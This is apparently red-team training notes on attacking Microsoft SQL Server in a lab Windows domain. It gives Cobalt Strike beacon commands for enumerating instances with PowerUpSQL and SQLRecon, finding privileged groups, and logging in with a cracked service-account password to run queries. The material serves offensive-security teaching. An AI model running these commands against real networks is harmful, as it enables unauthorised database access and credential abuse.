# MS SQL Servers

Microsoft SQL Server is a relational DBMS commonly found in Windows, used to store information to support many business functions. In addition to the obvious data theft opportunities, MSSQL has a large attack surface allowing code execution, privilege escalation, lateral movement, and persistence.

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) and [SQLRecon](https://github.com/skahwah/SQLRecon) are good for enumerating and interacting with MS SQL.

PowerUpSQL can find MSSQL using Get-SQLInstanceDomain, Get-SQLInstanceBroadcast and Get-SQLInstanceScanUDP:

* Get-SQLInstanceDomain searches for SPNs that begin with MSSQL*. Can also search the domain for groups that sound like they may have access to database instances (for example, a "SQL Admins" group).

      beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
      beacon> powershell Get-SQLInstanceDomain

* Get-SQLConnectionTest can be used to test whether we can connect to the database:

      beacon> powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl

* Get-SQLServerInfo to gather more information about the instance:

      beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"

If multiple SQL Servers exist, chain these commands together to automate the data collection:

    beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

SQLRecon can also enumerate servers via SPNs and fetch information about the instance with the ```info``` module.

    beacon> execute-assembly SQLRecon.exe /enum:sqlspns
    beacon> execute-assembly SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info

The /auth:wintoken option uses the access token of the Beacon. The example output shows that while the database is accessible, the current user is not a sysadmin. SQLRecon has a nice module which can show us what roles we do have:

    beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

On a default installation, standard users do not have the "public" role by default and must be explicitly granted through SQL Server Manager Studio (SSMS). The SQL information cannot be enumerated if the user's security context does not have a valid role. Finding a user (or group) that does have access can be challenging. Look for appropriately named domain groups and their members:

    beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }

Another option is to go after the MS SQL service account itself (often given sysadmin). The basis of BloodHound's SQLAdmin attack path. The domain account used to run the service is DEV\mssql_svc and the account is kerberoastable owing to its SPN.  If we can crack its plaintext password, we can use it to gain access to the SQL instance. The credentials can be used with make_token in Beacon and /a:WinToken in SQLRecon or the /a:WinDomain option with /d:<domain> /u:<username> /p:<password> in SQLRecon directly:

    beacon> execute-assembly SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

With access several options exist for issuing queries against a SQL instance.

* Get-SQLQuery from PowerUpSQL:

      beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"

* SQLRecon:

      beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"

* mssqlclient.py from Impacket via proxychains:

      ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
      SQL> select @@servername;

* [HeidiSQL](https://www.heidisql.com) via Proxifier (a GUI tool)

## 
